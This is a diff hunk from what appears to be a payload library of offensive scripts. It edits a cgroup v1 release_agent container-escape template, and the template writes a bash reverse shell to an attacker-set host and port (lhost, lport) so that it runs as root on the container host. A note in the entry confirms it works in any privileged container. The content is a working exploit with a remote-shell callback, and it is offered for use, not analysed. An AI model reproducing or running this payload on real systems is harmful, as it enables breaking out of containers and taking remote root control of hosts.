@@ -314,9 +314,9 @@ mount -t cgroup -o rdma cgroup /tmp/nx_cg 2>/dev/null || mount -t cgroup2 cgroup
 mkdir -p /tmp/nx_cg/nx 2>/dev/null
 echo 1 > /tmp/nx_cg/nx/notify_on_release 2>/dev/null
 HOST_PATH=$(sed -n 's/.*\\s\\(\\S*\\)\\sro.*/\\1/p;s/.*\\s\\(\\S*\\)\\srw.*/\\1/p' /proc/mounts 2>/dev/null | grep -v '^/$' | head -1)
-echo "bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'" > "${HOST_PATH:-/host}/cmd" 2>/dev/null
-chmod +x "${HOST_PATH:-/host}/cmd" 2>/dev/null
-echo "${HOST_PATH:-/host}/cmd" > /tmp/nx_cg/release_agent 2>/dev/null
+echo "bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'" > "\${HOST_PATH:-/host}/cmd" 2>/dev/null
+chmod +x "\${HOST_PATH:-/host}/cmd" 2>/dev/null
+echo "\${HOST_PATH:-/host}/cmd" > /tmp/nx_cg/release_agent 2>/dev/null
 sh -c "echo \$\$ > /tmp/nx_cg/nx/cgroup.procs" 2>/dev/null`,
       notes:"cgroup v1 release_agent escape — fires on last process exit in cgroup. Executes as root on host. Works in any --privileged container with cgroup v1 available.",
     },
